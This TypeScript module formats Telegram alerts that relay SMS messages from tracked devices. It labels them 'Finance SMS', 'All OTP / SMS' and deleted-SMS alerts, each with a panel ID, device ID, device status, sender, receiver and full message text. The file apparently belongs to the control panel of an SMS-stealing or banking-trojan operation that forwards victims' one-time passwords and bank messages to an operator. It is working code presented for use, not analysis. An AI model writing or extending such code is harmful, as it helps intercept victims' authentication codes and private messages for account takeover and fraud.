import { telegramHtml } from "../services/telegramService";

type BaseDeviceTelegramParams = {
  pannelId?: string;
  deviceId: string;
  brandName?: string;
  model?: string;
  online?: boolean;
  lastSeen?: number;
};

type BuildTelegramSmsMessageParams = BaseDeviceTelegramParams & {
  categoryLabels?: string[];
  smsText: string;
  smsTitle?: string;
  sender?: string;
  receiver?: string;
  timestamp?: number;
};

type BuildTelegramSmsDeletedMessageParams = BaseDeviceTelegramParams & {
  smsId?: string;
  smsText?: string;
  smsTitle?: string;
  sender?: string;
  receiver?: string;
  deletedAt?: number;
};

type BuildTelegramDeviceDeletedMessageParams = BaseDeviceTelegramParams & {
  deletedAt?: number;
};

type BuildTelegramAllOtpSmsMessageParams = BaseDeviceTelegramParams & {
  smsText: string;
  smsTitle?: string;
  sender?: string;
  receiver?: string;
  timestamp?: number;
};

function formatDateTime(ts?: number): string {
  const time = Number(ts || Date.now());
  const date = new Date(Number.isFinite(time) ? time : Date.now());

  const yyyy = date.getFullYear();
  const mm = String(date.getMonth() + 1).padStart(2, "0");
  const dd = String(date.getDate()).padStart(2, "0");
  const hh = String(date.getHours()).padStart(2, "0");
  const mi = String(date.getMinutes()).padStart(2, "0");
  const ss = String(date.getSeconds()).padStart(2, "0");

  return `${yyyy}-${mm}-${dd} ${hh}:${mi}:${ss}`;
}

function normalizeCategoryLabels(labels?: string[]): string[] {
  const arr = Array.isArray(labels) ? labels.filter(Boolean) : [];
  if (!arr.length) return ["Finance"];
  return arr;
}

function statusText(online?: boolean): string {
  return online ? "Online" : "Offline";
}

function slugifyTag(value: unknown): string {
  return String(value ?? "")
    .trim()
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "_")
    .replace(/^_+|_+$/g, "");
}

function buildTags(params: BaseDeviceTelegramParams, extraTags: string[] = []): string {
  const tags: string[] = [];

  const panelTag = slugifyTag(params.pannelId);
  const deviceTag = slugifyTag(params.deviceId);
  const brandTag = slugifyTag(params.brandName);
  const modelTag = slugifyTag(params.model);
  const statusTag = params.online ? "online" : "offline";

  if (panelTag) tags.push(`#panelid_${panelTag}`);
  if (deviceTag) tags.push(`#device_${deviceTag}`);
  if (brandTag) tags.push(`#brand_${brandTag}`);
  if (modelTag) tags.push(`#model_${modelTag}`);
  tags.push(`#${statusTag}`);

  for (const tag of extraTags) {
    const cleanTag = slugifyTag(tag);
    if (cleanTag) tags.push(`#${cleanTag}`);
  }

  return Array.from(new Set(tags)).join(" ");
}

function pushBaseDeviceLines(lines: string[], params: BaseDeviceTelegramParams) {
  const pannelId = telegramHtml(params.pannelId || "");
  const deviceId = telegramHtml(params.deviceId || "");
  const brandName = telegramHtml(params.brandName || "");
  const model = telegramHtml(params.model || "");
  const onlineText = telegramHtml(statusText(params.online));
  const lastSeenText = telegramHtml(formatDateTime(params.lastSeen));

  if (pannelId) {
    lines.push(`<b>Pannel ID:</b> ${pannelId}`);
  }

  lines.push(`<b>Device ID:</b> ${deviceId}`);

  if (brandName) {
    lines.push(`<b>Brand:</b> ${brandName}`);
  }

  if (model) {
    lines.push(`<b>Model:</b> ${model}`);
  }

  lines.push(`<b>Status:</b> ${onlineText}`);
  lines.push(`<b>Last Seen:</b> ${lastSeenText}`);
}

export function buildTelegramSmsMessage(
  params: BuildTelegramSmsMessageParams,
): string {
  const sender = telegramHtml(params.sender || "");
  const receiver = telegramHtml(params.receiver || "");
  const smsTitle = telegramHtml(params.smsTitle || "");
  const smsText = telegramHtml(params.smsText || "");
  const normalizedLabels = normalizeCategoryLabels(params.categoryLabels);
  const categoryText = telegramHtml(normalizedLabels.join(", "));
  const timeText = telegramHtml(formatDateTime(params.timestamp));
  const tags = buildTags(
    params,
    normalizedLabels.map((x) => x.toLowerCase()).concat(["finance_sms"]),
  );

  const lines: string[] = [];

  lines.push("<b>Finance SMS Alert</b>");
  lines.push("");

  if (tags) {
    lines.push(tags);
    lines.push("");
  }

  pushBaseDeviceLines(lines, params);

  lines.push(`<b>Category:</b> ${categoryText}`);
  lines.push(`<b>Time:</b> ${timeText}`);

  if (sender) {
    lines.push(`<b>Sender:</b> ${sender}`);
  }

  if (receiver) {
    lines.push(`<b>Receiver:</b> ${receiver}`);
  }

  if (smsTitle) {
    lines.push(`<b>Title:</b> ${smsTitle}`);
  }

  lines.push("");
  lines.push("<b>SMS:</b>");
  lines.push(smsText || "-");

  return lines.join("\n");
}

export function buildTelegramAllOtpSmsMessage(
  params: BuildTelegramAllOtpSmsMessageParams,
): string {
  const sender = telegramHtml(params.sender || "");
  const receiver = telegramHtml(params.receiver || "");
  const smsTitle = telegramHtml(params.smsTitle || "");
  const smsText = telegramHtml(params.smsText || "");
  const timeText = telegramHtml(formatDateTime(params.timestamp));
  const tags = buildTags(params, ["all_sms", "otp_sms"]);

  const lines: string[] = [];

  lines.push("<b>All OTP / SMS Alert</b>");
  lines.push("");

  if (tags) {
    lines.push(tags);
    lines.push("");
  }

  pushBaseDeviceLines(lines, params);

  lines.push(`<b>Time:</b> ${timeText}`);

  if (sender) {
    lines.push(`<b>Sender:</b> ${sender}`);
  }

  if (receiver) {
    lines.push(`<b>Receiver:</b> ${receiver}`);
  }

  if (smsTitle) {
    lines.push(`<b>Title:</b> ${smsTitle}`);
  }

  lines.push("");
  lines.push("<b>SMS:</b>");
  lines.push(smsText || "-");

  return lines.join("\n");
}

export function buildTelegramSmsDeletedMessage(
  params: BuildTelegramSmsDeletedMessageParams,
): string {
  const smsId = telegramHtml(params.smsId || "");
  const sender = telegramHtml(params.sender || "");
  const receiver = telegramHtml(params.receiver || "");
  const smsTitle = telegramHtml(params.smsTitle || "");
  const smsText = telegramHtml(params.smsText || "");
  const deletedAt = telegramHtml(formatDateTime(params.deletedAt));
  const tags = buildTags(params, ["deleted_sms"]);

  const lines: string[] = [];

  lines.push("<b>SMS Deleted Alert</b>");
  lines.push("");

  if (tags) {
    lines.push(tags);
    lines.push("");
  }

  pushBaseDeviceLines(lines, params);

  if (smsId) {
    lines.push(`<b>Deleted SMS ID:</b> ${smsId}`);
  }

  lines.push(`<b>Deleted At:</b> ${deletedAt}`);

  if (sender) {
    lines.push(`<b>Sender:</b> ${sender}`);
  }

  if (receiver) {
    lines.push(`<b>Receiver:</b> ${receiver}`);
  }

  if (smsTitle) {
    lines.push(`<b>Title:</b> ${smsTitle}`);
  }

  lines.push("");
  lines.push("<b>Deleted SMS:</b>");
  lines.push(smsText || "-");

  return lines.join("\n");
}

export function buildTelegramDeviceDeletedMessage(
  params: BuildTelegramDeviceDeletedMessageParams,
): string {
  const deletedAt = telegramHtml(formatDateTime(params.deletedAt));
  const tags = buildTags(params, ["deleted_device"]);
  const lines: string[] = [];

  lines.push("<b>Device Deleted Alert</b>");
  lines.push("");

  if (tags) {
    lines.push(tags);
    lines.push("");
  }

  pushBaseDeviceLines(lines, params);
  lines.push(`<b>Deleted At:</b> ${deletedAt}`);

  return lines.join("\n");
}

export default {
  buildTelegramSmsMessage,
  buildTelegramAllOtpSmsMessage,
  buildTelegramSmsDeletedMessage,
  buildTelegramDeviceDeletedMessage,
};
